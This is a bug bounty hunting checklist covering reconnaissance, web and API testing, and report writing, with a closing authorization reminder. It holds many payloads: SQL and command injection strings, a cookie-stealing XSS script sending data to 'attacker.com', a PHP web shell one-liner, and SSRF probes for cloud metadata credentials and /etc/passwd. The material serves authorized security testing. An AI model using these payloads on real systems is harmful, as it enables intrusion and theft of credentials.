# ✅ Complete Bug Bounty Hunting Checklist

> **Systematic approach to bug bounty hunting - never miss a vulnerability**

## 🎯 Pre-Hunt Preparation

### 📋 Program Analysis
- [ ] **Read program scope carefully**
  - [ ] In-scope domains and subdomains
  - [ ] In-scope IP ranges
  - [ ] Allowed testing methods
  - [ ] Prohibited activities
  - [ ] Reward ranges and severity ratings

- [ ] **Understand the business**
  - [ ] What does the company do?
  - [ ] What are their main products/services?
  - [ ] Who are their target customers?
  - [ ] What would be most valuable to attackers?

- [ ] **Check program statistics**
  - [ ] Number of resolved reports
  - [ ] Average response time
  - [ ] Bounty payment history
  - [ ] Top vulnerability types

- [ ] **Review disclosed reports**
  - [ ] Read public reports from this program
  - [ ] Understand common vulnerability patterns
  - [ ] Note testing methodologies that worked
  - [ ] Identify potential duplicate areas

### 🛠️ Tool Setup Verification
- [ ] **Burp Suite configured**
  - [ ] Proxy settings correct (127.0.0.1:8080)
  - [ ] CA certificate installed in browser
  - [ ] Extensions installed (Logger++, Autorize, etc.)
  - [ ] Project created for this target

- [ ] **Browser setup**
  - [ ] Proxy configured
  - [ ] Security extensions installed
  - [ ] Developer tools accessible
  - [ ] Multiple user agents available

- [ ] **Command line tools ready**
  - [ ] Subfinder, Amass, Assetfinder
  - [ ] Nmap, Masscan
  - [ ] Gobuster, Ffuf, Dirsearch
  - [ ] SQLMap, XSStrike, Nuclei

## 🔍 Phase 1: Reconnaissance

### 🌐 Passive Information Gathering

#### Domain and Subdomain Enumeration
- [ ] **Passive subdomain discovery**
  ```bash
  subfinder -d target.com -o subdomains.txt
  amass enum -passive -d target.com -o amass_passive.txt
  assetfinder target.com | tee assetfinder.txt
  ```

- [ ] **Certificate transparency logs**
  - [ ] crt.sh search
  - [ ] Censys certificate search
  - [ ] Facebook certificate transparency

- [ ] **Search engine reconnaissance**
  - [ ] Google dorking: `site:target.com`
  - [ ] Bing search: `site:target.com`
  - [ ] DuckDuckGo search
  - [ ] Shodan search: `ssl:target.com`

- [ ] **Social media and public repositories**
  - [ ] GitHub search for organization
  - [ ] GitLab, Bitbucket searches
  - [ ] LinkedIn employee enumeration
  - [ ] Twitter/X mentions and discussions

#### DNS Analysis
- [ ] **DNS record enumeration**
  ```bash
  dig target.com ANY
  nslookup target.com
  host -a target.com
  ```

- [ ] **DNS zone transfer attempts**
  ```bash
  dig axfr target.com @ns1.target.com
  ```

- [ ] **Reverse DNS lookups**
  ```bash
  nmap -sL target.com/24
  ```

### 🎯 Active Information Gathering

#### Subdomain Validation and Discovery
- [ ] **Validate discovered subdomains**
  ```bash
  httpx -l subdomains.txt -o live_subdomains.txt
  ```

- [ ] **Active subdomain brute forcing**
  ```bash
  amass enum -active -d target.com -o amass_active.txt
  gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
  ```

- [ ] **Subdomain permutation**
  ```bash
  altdns -i subdomains.txt -o permuted_subdomains.txt -w words.txt
  ```

#### Port Scanning and Service Enumeration
- [ ] **Initial port scan**
  ```bash
  nmap -sC -sV -oA initial_scan target.com
  ```

- [ ] **Full port scan**
  ```bash
  nmap -p- -oA full_scan target.com
  ```

- [ ] **UDP scan (top ports)**
  ```bash
  nmap -sU --top-ports 1000 -oA udp_scan target.com
  ```

- [ ] **Service-specific scans**
  ```bash
  nmap --script http-enum target.com
  nmap --script ssl-enum-ciphers target.com
  ```

#### Technology Stack Identification
- [ ] **Web technology detection**
  - [ ] Wappalyzer browser extension
  - [ ] Whatweb command line tool
  - [ ] Builtwith.com analysis

- [ ] **Server and framework identification**
  - [ ] HTTP headers analysis
  - [ ] Error page analysis
  - [ ] Default file detection

## 🕷️ Phase 2: Web Application Analysis

### 🗺️ Application Mapping

#### Content Discovery
- [ ] **Directory enumeration**
  ```bash
  gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt
  ```

- [ ] **File enumeration**
  ```bash
  ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -u https://target.com/FUZZ
  ```

- [ ] **Backup file discovery**
  ```bash
  # Look for .bak, .old, .backup, .zip files
  ffuf -w backup_extensions.txt -u https://target.com/indexFUZZ
  ```

#### Application Crawling
- [ ] **Automated crawling**
  ```bash
  katana -u https://target.com -d 3 -o crawled_urls.txt
  hakrawler -url https://target.com -depth 3
  ```

- [ ] **Manual browsing**
  - [ ] Browse all discovered pages
  - [ ] Fill out forms with test data
  - [ ] Test different user roles
  - [ ] Map application functionality

#### Parameter Discovery
- [ ] **Parameter fuzzing**
  ```bash
  paramspider -d target.com -o params.txt
  arjun -u https://target.com -oT arjun_params.txt
  ```

- [ ] **Hidden parameter discovery**
  ```bash
  ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u https://target.com/page?FUZZ=test
  ```

### 🔐 Authentication Testing

#### Authentication Mechanisms
- [ ] **Login functionality analysis**
  - [ ] Username enumeration
  - [ ] Password policy testing
  - [ ] Account lockout testing
  - [ ] Multi-factor authentication bypass

- [ ] **Session management**
  - [ ] Session token analysis
  - [ ] Session fixation testing
  - [ ] Session timeout testing
  - [ ] Concurrent session handling

#### Common Authentication Bypasses
- [ ] **SQL injection in login**
  ```sql
  admin' OR '1'='1'--
  admin'/**/OR/**/1=1--
  ```

- [ ] **NoSQL injection**
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  ```

- [ ] **LDAP injection**
  ```
  *)(uid=*))(|(uid=*
  ```

## 🎯 Phase 3: Vulnerability Testing

### 💉 Injection Vulnerabilities

#### SQL Injection Testing
- [ ] **Manual testing**
  - [ ] Single quote test: `'`
  - [ ] Double quote test: `"`
  - [ ] Numeric test: `1'`
  - [ ] Boolean test: `1' AND '1'='1`

- [ ] **Automated testing**
  ```bash
  sqlmap -u "https://target.com/page.php?id=1" --batch --random-agent
  ```

- [ ] **Advanced techniques**
  - [ ] Time-based blind injection
  - [ ] Boolean-based blind injection
  - [ ] Union-based injection
  - [ ] Error-based injection

#### Command Injection Testing
- [ ] **Basic payloads**
  ```bash
  ; ls
  | whoami
  & ping -c 4 127.0.0.1
  `id`
  $(whoami)
  ```

- [ ] **Blind command injection**
  ```bash
  ; sleep 10
  | ping -c 10 attacker.com
  & nslookup attacker.com
  ```

#### Template Injection Testing
- [ ] **Server-side template injection**
  ```
  {{7*7}}
  ${7*7}
  <%= 7*7 %>
  ${{7*7}}
  ```

- [ ] **Client-side template injection**
  ```javascript
  {{constructor.constructor('alert(1)')()}}
  ```

### 🔓 Cross-Site Scripting (XSS)

#### Reflected XSS
- [ ] **Basic payloads**
  ```html
  <script>alert('XSS')</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  ```

- [ ] **Filter bypass techniques**
  ```html
  <ScRiPt>alert('XSS')</ScRiPt>
  <img src="x" onerror="alert(String.fromCharCode(88,83,83))">
  <svg><script>alert&#40;'XSS'&#41;</script>
  ```

#### Stored XSS
- [ ] **Test all input fields**
  - [ ] Comment sections
  - [ ] User profiles
  - [ ] File uploads
  - [ ] Contact forms

- [ ] **Advanced payloads**
  ```html
  <script>fetch('/admin',{method:'POST',body:'action=delete&user=victim'})</script>
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
  ```

#### DOM XSS
- [ ] **Source and sink analysis**
  - [ ] URL parameters → innerHTML
  - [ ] document.location → eval()
  - [ ] window.name → document.write()

- [ ] **Testing techniques**
  ```javascript
  #<script>alert('DOM XSS')</script>
  javascript:alert('DOM XSS')
  ```

### 🔐 Access Control Testing

#### Broken Access Control
- [ ] **Vertical privilege escalation**
  - [ ] Access admin functions as regular user
  - [ ] Modify user role parameters
  - [ ] Direct URL access to admin pages

- [ ] **Horizontal privilege escalation**
  - [ ] Access other users' data
  - [ ] Modify user ID parameters
  - [ ] Session token manipulation

#### Insecure Direct Object References (IDOR)
- [ ] **Parameter manipulation**
  ```
  /user/profile?id=123 → /user/profile?id=124
  /api/user/123 → /api/user/124
  /document/download/456 → /document/download/457
  ```

- [ ] **HTTP method testing**
  ```bash
  # Try different HTTP methods
  GET /api/user/123
  POST /api/user/123
  PUT /api/user/123
  DELETE /api/user/123
  ```

### 🌐 Server-Side Request Forgery (SSRF)

#### Basic SSRF Testing
- [ ] **Internal network access**
  ```
  http://127.0.0.1:80
  http://localhost:22
  http://192.168.1.1:80
  ```

- [ ] **Cloud metadata access**
  ```
  http://169.254.169.254/latest/meta-data/
  http://metadata.google.internal/computeMetadata/v1/
  ```

#### Advanced SSRF Techniques
- [ ] **Protocol smuggling**
  ```
  gopher://127.0.0.1:6379/_INFO
  file:///etc/passwd
  dict://127.0.0.1:11211/
  ```

- [ ] **Filter bypasses**
  ```
  http://127.1:80
  http://0x7f000001:80
  http://2130706433:80
  ```

### 🔄 Cross-Site Request Forgery (CSRF)

#### CSRF Testing
- [ ] **Basic CSRF**
  ```html
  <form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
    <input type="submit" value="Click me">
  </form>
  ```

- [ ] **CSRF token bypass**
  - [ ] Remove CSRF token
  - [ ] Use empty CSRF token
  - [ ] Use another user's token
  - [ ] Change request method (POST to GET)

### 📁 File Upload Vulnerabilities

#### File Upload Testing
- [ ] **Malicious file uploads**
  ```php
  <?php system($_GET['cmd']); ?>
  ```

- [ ] **Extension bypasses**
  ```
  shell.php
  shell.php.jpg
  shell.php%00.jpg
  shell.php;.jpg
  ```

- [ ] **Content-Type bypasses**
  ```
  Content-Type: image/jpeg (with PHP code)
  Content-Type: text/plain (with script)
  ```

### 🔒 Business Logic Vulnerabilities

#### Race Conditions
- [ ] **Concurrent requests**
  - [ ] Multiple password reset requests
  - [ ] Simultaneous money transfers
  - [ ] Parallel coupon usage

#### Price Manipulation
- [ ] **Negative quantities**
  - [ ] Add -1 expensive item
  - [ ] Add 1 cheap item
  - [ ] Total becomes negative

#### Workflow Bypasses
- [ ] **Step skipping**
  - [ ] Skip payment step
  - [ ] Bypass verification steps
  - [ ] Direct access to final step

## 🔍 Phase 4: Advanced Testing

### 📱 Mobile Application Testing

#### Android Application Analysis
- [ ] **Static analysis**
  ```bash
  apktool d application.apk
  jadx application.apk
  ```

- [ ] **Dynamic analysis**
  ```bash
  frida -U -f com.example.app -l script.js
  ```

#### iOS Application Analysis
- [ ] **Static analysis**
  ```bash
  class-dump-z application.ipa
  otool -L application
  ```

### 🔌 API Security Testing

#### REST API Testing
- [ ] **Endpoint enumeration**
  - [ ] /api/v1/users
  - [ ] /api/v2/users
  - [ ] /graphql

- [ ] **HTTP method testing**
  ```bash
  curl -X GET https://api.target.com/users/1
  curl -X POST https://api.target.com/users/1
  curl -X PUT https://api.target.com/users/1
  curl -X DELETE https://api.target.com/users/1
  ```

#### GraphQL Testing
- [ ] **Introspection queries**
  ```graphql
  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
    }
  }
  ```

### ☁️ Cloud Security Testing

#### AWS Security Testing
- [ ] **S3 bucket enumeration**
  ```bash
  aws s3 ls s3://bucket-name --no-sign-request
  ```

- [ ] **Metadata service access**
  ```
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

## 📝 Phase 5: Documentation and Reporting

### 📊 Vulnerability Documentation

#### Evidence Collection
- [ ] **Screenshots**
  - [ ] Vulnerability demonstration
  - [ ] Proof of concept
  - [ ] Impact demonstration

- [ ] **HTTP requests/responses**
  - [ ] Raw HTTP traffic
  - [ ] Burp Suite history
  - [ ] cURL commands

#### Impact Assessment
- [ ] **Technical impact**
  - [ ] Data access/modification
  - [ ] System compromise
  - [ ] Service disruption

- [ ] **Business impact**
  - [ ] Financial loss
  - [ ] Reputation damage
  - [ ] Compliance violations

### 📋 Report Writing

#### Report Structure
- [ ] **Executive summary**
  - [ ] Vulnerability overview
  - [ ] Risk rating
  - [ ] Recommended actions

- [ ] **Technical details**
  - [ ] Vulnerability description
  - [ ] Affected components
  - [ ] Root cause analysis

- [ ] **Reproduction steps**
  - [ ] Step-by-step instructions
  - [ ] Required tools/setup
  - [ ] Expected vs actual results

- [ ] **Proof of concept**
  - [ ] Working exploit code
  - [ ] Screenshots/videos
  - [ ] Impact demonstration

- [ ] **Remediation**
  - [ ] Specific fix recommendations
  - [ ] Code examples
  - [ ] Best practices

## 🔄 Post-Submission Activities

### 📈 Continuous Monitoring

#### Program Updates
- [ ] **Monitor scope changes**
  - [ ] New domains added
  - [ ] New applications launched
  - [ ] Policy updates

- [ ] **Track new vulnerabilities**
  - [ ] CVE databases
  - [ ] Security advisories
  - [ ] Research publications

#### Skill Development
- [ ] **Learn from rejections**
  - [ ] Understand why reports were rejected
  - [ ] Improve testing methodology
  - [ ] Enhance reporting skills

- [ ] **Study disclosed reports**
  - [ ] Analyze successful reports
  - [ ] Learn new techniques
  - [ ] Understand impact assessment

## 🎯 Specialized Testing Checklists

### 🔐 Authentication & Session Management
- [ ] Username enumeration
- [ ] Password brute forcing
- [ ] Account lockout bypass
- [ ] Password reset vulnerabilities
- [ ] Session fixation
- [ ] Session hijacking
- [ ] Concurrent session handling
- [ ] Logout functionality
- [ ] Remember me functionality
- [ ] Multi-factor authentication bypass

### 💳 Payment & Financial Functions
- [ ] Price manipulation
- [ ] Currency conversion issues
- [ ] Discount code abuse
- [ ] Refund process vulnerabilities
- [ ] Payment bypass
- [ ] Race conditions in transactions
- [ ] Negative amount handling
- [ ] Tax calculation errors

### 📧 Email & Communication Features
- [ ] Email header injection
- [ ] SMTP injection
- [ ] Email spoofing
- [ ] Unsubscribe link manipulation
- [ ] Email template injection
- [ ] Attachment upload vulnerabilities

### 🔍 Search & Filter Functions
- [ ] Search injection (SQL, NoSQL, LDAP)
- [ ] Filter bypass
- [ ] Search result manipulation
- [ ] Autocomplete injection
- [ ] Search history exposure

### 📤 File Upload & Download
- [ ] Malicious file upload
- [ ] File type validation bypass
- [ ] Path traversal in uploads
- [ ] File inclusion vulnerabilities
- [ ] Download path traversal
- [ ] Zip slip vulnerabilities

## 🚨 Critical Security Checks

### 🔒 High-Impact Vulnerabilities
- [ ] **Remote Code Execution (RCE)**
  - [ ] Command injection
  - [ ] Deserialization attacks
  - [ ] Template injection
  - [ ] File upload RCE

- [ ] **SQL Injection**
  - [ ] Union-based
  - [ ] Boolean-based blind
  - [ ] Time-based blind
  - [ ] Error-based

- [ ] **Authentication Bypass**
  - [ ] SQL injection in login
  - [ ] NoSQL injection
  - [ ] JWT vulnerabilities
  - [ ] OAuth flaws

- [ ] **Privilege Escalation**
  - [ ] Vertical escalation
  - [ ] Horizontal escalation
  - [ ] Role manipulation
  - [ ] Admin function access

### ⚡ Quick Win Vulnerabilities
- [ ] **Information Disclosure**
  - [ ] Directory listing
  - [ ] Backup files
  - [ ] Error messages
  - [ ] Debug information

- [ ] **Security Misconfigurations**
  - [ ] Default credentials
  - [ ] Missing security headers
  - [ ] Verbose error pages
  - [ ] Unnecessary services

- [ ] **Cross-Site Scripting (XSS)**
  - [ ] Reflected XSS
  - [ ] Stored XSS
  - [ ] DOM XSS
  - [ ] Self-XSS with social engineering

## 📊 Progress Tracking

### 📈 Daily Checklist
- [ ] Target reconnaissance completed
- [ ] Subdomain enumeration performed
- [ ] Port scanning completed
- [ ] Web application mapped
- [ ] Vulnerability testing conducted
- [ ] Findings documented
- [ ] Reports submitted

### 📅 Weekly Review
- [ ] Review submitted reports
- [ ] Analyze program responses
- [ ] Update methodology based on learnings
- [ ] Research new techniques
- [ ] Practice on new targets

### 📋 Monthly Assessment
- [ ] Evaluate success rate
- [ ] Identify skill gaps
- [ ] Update tool arsenal
- [ ] Review industry trends
- [ ] Set goals for next month

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**🎯 Remember**: This checklist is comprehensive but not exhaustive. Always adapt your testing approach based on the specific application and its functionality. Stay curious, be thorough, and never stop learning!

**⚖️ Legal Reminder**: Always ensure you have proper authorization before testing any system. Follow responsible disclosure practices and respect program rules and scope.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*